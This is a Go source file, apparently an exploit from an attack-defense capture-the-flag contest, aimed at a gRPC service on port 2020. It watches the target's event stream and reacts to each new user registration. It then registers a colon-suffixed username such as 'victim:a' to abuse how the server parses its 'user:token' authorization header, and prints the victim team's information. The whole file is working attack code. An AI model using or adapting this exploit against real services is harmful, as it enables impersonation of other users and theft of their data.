package main

import (
	"context"
	"fmt"
	"github.com/bxcodec/faker/v3"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
	"os"
	pb "sploits/pb"
	"strings"
	"time"
)

func sploitRegister(client pb.ApiClient, user string) {
	// for user register team
	time.Sleep(10 * time.Second)

	fakeUser := fmt.Sprintf("%s:a", user)

	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		Username: fakeUser,
		Password: faker.Password(),
	})
	if err != nil {
		return
	}

	ctx := metadata.AppendToOutgoingContext(
		context.Background(),
		"authorization",
		fmt.Sprintf("%s:%s", fakeUser, resp.Token),
	)

	info, err := client.Info(ctx, &pb.InfoRequest{})
	if err != nil {
		return
	}

	fmt.Println(info.TeamInfo)
}

func main() {
	ip := os.Args[1]
	conn, err := grpc.Dial(fmt.Sprintf("%s:%v", ip, 2020), grpc.WithInsecure())
	if err != nil {
		return
	}
	defer conn.Close()

	client := pb.NewApiClient(conn)

	eventsClient, err := client.Events(context.Background(), &pb.EventsRequest{})
	if err != nil {
		return
	}

	fmt.Println("Connected to events stream")
	for {
		e, err := eventsClient.Recv()
		if err != nil {
			return
		}

		if e.Type == pb.Event_register && !strings.Contains(e.Username, ":") {
			fmt.Println("Found register user event")
			go sploitRegister(client, e.Username)
		}
	}
}
